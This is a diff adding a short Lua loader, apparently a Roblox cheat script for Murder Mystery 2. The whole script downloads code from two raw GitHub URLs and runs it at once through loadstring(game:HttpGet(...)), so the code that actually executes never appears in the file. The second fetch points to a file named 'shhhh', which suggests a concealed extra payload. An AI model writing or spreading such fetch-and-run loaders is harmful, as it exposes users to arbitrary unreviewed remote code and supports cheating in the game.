@@ -1,0 +1,5 @@
+local realScript = "https://raw.githubusercontent.com/real-bluez/MM2/refs/heads/main/LocalPlayerScripts"
+local other = "https://raw.githubusercontent.com/real-bluez/Visuals/refs/heads/main/shhhh"
+
+task.spawn(loadstring(game:HttpGet(realScript, true)))
+task.spawn(loadstring(game:HttpGet(other, true)))
